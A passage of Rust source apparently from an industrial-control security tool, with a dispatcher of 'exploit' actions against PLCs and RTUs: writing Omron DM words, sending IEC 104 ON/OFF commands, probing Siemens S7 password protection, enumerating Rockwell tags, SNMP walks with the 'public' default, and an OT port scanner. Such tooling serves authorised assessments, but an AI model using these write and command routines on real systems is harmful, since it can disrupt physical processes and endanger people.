                .map_err(|_| anyhow::anyhow!("Invalid start address: '{username}'"))?;
            let mut values: Vec<u16> = Vec::new();
            for s in password.split_whitespace() {
                values.push(
                    s.parse::<u16>()
                        .map_err(|_| anyhow::anyhow!("Invalid value '{s}': must be 0–65535"))?,
                );
            }
            if values.is_empty() {
                anyhow::bail!("No values provided in Password field");
            }
            fins::write_dm_words(ip, 9600, 0, start, &values)?;
            Ok(format!("Wrote {} word(s) starting at DM{} on {ip}.", values.len(), start))
        }

        "mitsubishi/info" => {
            use crate::vendors::mitsubishi::scan;
            let devices = scan::scan_ip(ip, 3, true)?;
            if devices.is_empty() {
                return Ok(format!(
                    "No device info returned from {ip} via discovery.\n\
                     Device may use TCP-only SLMP: try Read D Registers or Read M Bits."
                ));
            }
            let mut out = String::new();
            for dev in &devices {
                writeln!(out, "IP:       {}", dev.ip).ok();
                writeln!(out, "Type:     {}", dev.plc_type).ok();
                if let Some(t) = &dev.title { writeln!(out, "Title:    {t}").ok(); }
                if let Some(c) = &dev.comment { writeln!(out, "Comment:  {c}").ok(); }
                if let Some(p) = &dev.protocol { writeln!(out, "Protocol: {p}").ok(); }
                if let Some(port) = dev.port { writeln!(out, "Port:     {port}").ok(); }
                writeln!(out, "---").ok();
            }
            Ok(out)
        }

        "mitsubishi/read_d" => {
            use crate::vendors::mitsubishi::slmp;
            let start: u32 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(20).min(100);
            let words = slmp::read_word_devices(ip, 5007, "D", start, count)?;
            let mut out = String::new();
            for v in &words {
                writeln!(out, "{}: {}", v.display, v.value_str).ok();
            }
            Ok(out)
        }

        "mitsubishi/read_m" => {
            use crate::vendors::mitsubishi::slmp;
            let start: u32 = username.trim().parse().unwrap_or(0);
            let count: u16 = password.trim().parse().unwrap_or(20).min(100);
            let bits = slmp::read_bit_devices(ip, 5007, "M", start, count)?;
            let mut out = String::new();
            for v in &bits {
                writeln!(out, "{}: {}", v.display, v.value_str).ok();
            }
            Ok(out)
        }

        "iec104/gi" => {
            use crate::vendors::iec104::client;
            let mut session = client::connect(ip, 2404)?;
            let objects = client::general_interrogation(&mut session)?;
            if objects.is_empty() {
                return Ok("General Interrogation completed: no data objects returned.".into());
            }
            let mut out = String::new();
            for obj in &objects {
                writeln!(out, "IOA {:>6} (type {:>3}): {}", obj.ioa, obj.type_id, obj.decoded).ok();
            }
            Ok(out)
        }

        "iec104/sc_on" | "iec104/sc_off" => {
            use crate::vendors::iec104::client;
            let ioa: u32 = username.trim().parse().unwrap_or(1);
            let on = id == "iec104/sc_on";
            let mut session = client::connect(ip, 2404)?;
            let confirmed = client::single_command(&mut session, ioa, on)?;
            if confirmed {
                Ok(format!(
                    "Single command {} IOA {ioa} confirmed on {ip}.",
                    if on { "ON" } else { "OFF" }
                ))
            } else {
                anyhow::bail!(
                    "Single command IOA {ioa} received negative acknowledgement from {ip}"
                )
            }
        }

        "siemens/probe_auth" => {
            use crate::vendors::siemens::s7comm;
            if s7comm::probe_auth_required(ip, 102, 5) {
                Ok(format!("{ip} has S7Comm access protection enabled — a CPU password is required."))
            } else {
                Ok(format!("{ip} has no S7Comm access protection — commands succeed without a password."))
            }
        }

        "rockwell/identity" => {
            use crate::vendors::rockwell::driver;
            let dev = driver::get_device_info(ip, 44818)?;
            Ok(format!(
                "Vendor:       {}\nProduct Type: {}\nProduct Code: {}\nRevision:     {}\nSerial:       {}\nName:         {}",
                dev.vendor, dev.product_type, dev.product_code, dev.revision, dev.serial, dev.product_name
            ))
        }

        "rockwell/list_tags" => {
            use crate::vendors::rockwell::driver;
            let all_tags = driver::enumerate_tags(ip, 44818)?;
            let shown: Vec<&driver::LogixTag> = all_tags
                .iter()
                .filter(|t| !t.name.starts_with('_'))
                .take(50)
                .collect();
            if shown.is_empty() {
                return Ok("No tags found.".into());
            }
            let mut out = String::new();
            for t in &shown {
                writeln!(out, "{:<40} type=0x{:04x}", t.name, t.tag_type).ok();
            }
            Ok(out)
        }

        "snmp/sys_info" => {
            use crate::vendors::snmp::client;
            let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
            let varbinds = client::walk(ip, 161, &community, ".1.3.6.1.2.1.1")?;
            if varbinds.is_empty() {
                return Ok("No SNMP data returned from system subtree.".into());
            }
            let mut out = String::new();
            for (oid, val) in &varbinds {
                writeln!(out, "{oid}: {}", val.display()).ok();
            }
            Ok(out)
        }

        "snmp/interfaces" => {
            use crate::vendors::snmp::client;
            let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
            let varbinds = client::walk(ip, 161, &community, ".1.3.6.1.2.1.2")?;
            if varbinds.is_empty() {
                return Ok("No SNMP interface data returned.".into());
            }
            let mut out = String::new();
            for (oid, val) in &varbinds {
                writeln!(out, "{oid}: {}", val.display()).ok();
            }
            Ok(out)
        }

        "snmp/walk" => {
            use crate::vendors::snmp::client;
            let community = if username.is_empty() { "public" } else { username };
            let oid = if password.is_empty() { ".1.3.6.1.2.1.1" } else { password };
            let varbinds = client::walk(ip, 161, community, oid)?;
            if varbinds.is_empty() {
                return Ok(format!("No SNMP data returned for OID {oid} with community '{community}'."));
            }
            let mut out = String::new();
            for (o, val) in &varbinds {
                writeln!(out, "{o}: {}", val.display()).ok();
            }
            Ok(out)
        }

        _ => anyhow::bail!("Unknown exploit: {id}"),
    }
}

// ─── Port scanner ─────────────────────────────────────────────────────────────

async fn api_portscan(Json(req): Json<PortscanReq>) -> Json<Value> {
    let result = tokio::task::spawn_blocking(move || {
        crate::core::portscan::scan_ot_ports(&req.ip, req.timeout, &req.extra_ports)
    })
    .await;

    match result {
        Ok(results) => {
            let ports: Vec<Value> = results
                .into_iter()
                .filter(|r| r.open)
                .map(|r| {
                    json!({
                        "port": r.port,
                        "service": r.service,
                        "banner": r.banner,
                    })
                })
                .collect();
            Json(json!({"ports": ports}))
        }
        Err(e) => Json(json!({"ports": [], "error": e.to_string()})),
    }
}

// ─── WebSocket monitor ────────────────────────────────────────────────────────

async fn ws_monitor(
    ws: WebSocketUpgrade,
    headers: axum::http::HeaderMap,
    Path(ip): Path<String>,
    Query(q): Query<MonitorQuery>,
) -> Response {
    let origin_ok = headers
        .get("origin")
        .and_then(|v| v.to_str().ok())
        .map(|o| o.starts_with("http://localhost") || o.starts_with("http://127.0.0.1"))
        .unwrap_or(true); // no Origin header means same-origin (curl / CLI), allow
    if !origin_ok {
        return axum::http::StatusCode::FORBIDDEN.into_response();
    }
    ws.on_upgrade(move |socket| monitor_loop(socket, ip, q.vendor))
}

async fn monitor_loop(mut socket: WebSocket, ip: String, vendor: String) {
    loop {
        let ip2 = ip.clone();
        let vendor2 = vendor.clone();
        let payload = match tokio::task::spawn_blocking(
            move || read_tags_for_vendor(&ip2, &vendor2)
        ).await {
            Ok(tags) => json!({"tags": tags, "error": null}),
            Err(e) => json!({"tags": {}, "error": e.to_string()}),
        };

        let Ok(msg) = serde_json::to_string(&payload) else { break };

        if socket.send(Message::Text(msg)).await.is_err() {
            break;
        }

        sleep(Duration::from_secs(2)).await;
    }
}
